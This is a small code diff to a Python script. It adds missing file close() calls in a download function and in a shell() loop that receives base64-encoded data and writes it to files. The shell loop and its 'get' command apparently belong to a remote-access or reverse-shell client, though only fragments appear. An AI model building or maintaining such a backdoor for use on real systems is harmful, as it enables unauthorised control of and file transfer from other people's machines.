@@ -88,6 +88,7 @@ def download(url):
 	file_name = url.split("/")[-1]
 	out_file =open(file_name, "wb")
 	out_file.write(get_response.content)
+	out_file.close()
 
 def shell():		
 	while True:
@@ -131,7 +132,8 @@ def shell():
 				result = reliable_recv()
 				if result[:4] != "[!]":
 					fin = open(command [7:], "wb")
-					fin.write(base64.b64decode(result))						
+					fin.write(base64.b64decode(result))
+					fin.close()					
 
 		elif command [:3] == "get":
 			try:
